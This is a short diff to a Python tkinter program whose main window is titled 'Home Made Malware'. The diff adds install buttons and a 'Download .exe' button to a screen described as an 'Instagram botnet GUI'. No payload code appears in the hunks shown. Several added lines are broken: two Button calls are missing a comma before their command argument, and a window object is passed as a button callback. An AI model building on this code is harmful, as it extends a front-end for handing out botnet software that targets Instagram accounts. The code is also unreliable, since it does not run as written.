@@ -4,7 +4,7 @@ from msilib import Win64
 from struct import pack
 import tkinter
 from tkinter import *
-from turtle import width
+from turtle import back, width
 
 
 
@@ -129,9 +129,10 @@ def Utiligram_Func():
     win3.resizable(True, True)
     win3.title("Utiligram Installer")
     win3_l1 = Label(win3, text="Select the version below")
-    win3_butt1 = Button(win3, text="FULL INSTALL" )
-    win3_butt2 = Button(win3, text="Lightweight Install")
+    win3_butt1 = Button(win3, text="FULL INSTALL" command=Utiligram_Full_Func)
+    win3_butt2 = Button(win3, text="Lightweight Install", command=Utiligram_Lightweight_func)
     win3_butt3 = Button (win3, text="Minimal Install")
+    win3_butt4 = Button (win3, text="back" command=MAIN_PAGE)
     
 
 
@@ -198,7 +199,7 @@ def Unigram_Func():
     win8.title("Unigram")
     win8.resizable(True, True)
     win8_l1 = Label(win8, text="Unigram is a Instagram botnet GUI", bg="Black", fg="Green", font=("Roboto Mono", 30))
-    
+    win8_butt1 = Button(win8, text="Download .exe", command=Unigram_Func2)
     win8_l1.pack()
     win8.mainloop()
 
@@ -211,6 +212,7 @@ def Unigram_Func():
 
 
 MAIN_PAGE = Tk()
+
 MAIN_PAGE.title("Home Made Malware")
 MAIN_PAGE.geometry("600x600")
 MAIN_PAGE.configure(bg="grey")
